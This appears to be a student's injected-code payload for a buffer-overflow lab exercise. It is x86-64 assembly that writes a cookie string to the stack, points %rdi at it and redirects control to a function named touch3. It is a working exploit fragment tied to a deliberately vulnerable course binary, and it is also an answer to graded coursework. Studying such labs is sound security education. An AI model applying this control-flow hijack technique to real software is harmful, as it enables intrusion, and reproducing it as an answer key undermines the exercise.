/* cookie: 0x59b997fa */
/* ascii format of cookie: 0x3539623939376661 */

subl $0x8, %esp /* set rsp back to previous state*/
movq -0x8(%rsp), %rdi /* %rdi = cookie(ascii) */
movq %rdi, -0x3000(%rsp) /* move ascii cookie to safe place */
leal -0x3000(%rsp), %edi /* store ascii cookie address in %rdi */
movl $0x4018fa, (%esp) /* set touch3 address as return address */
ret
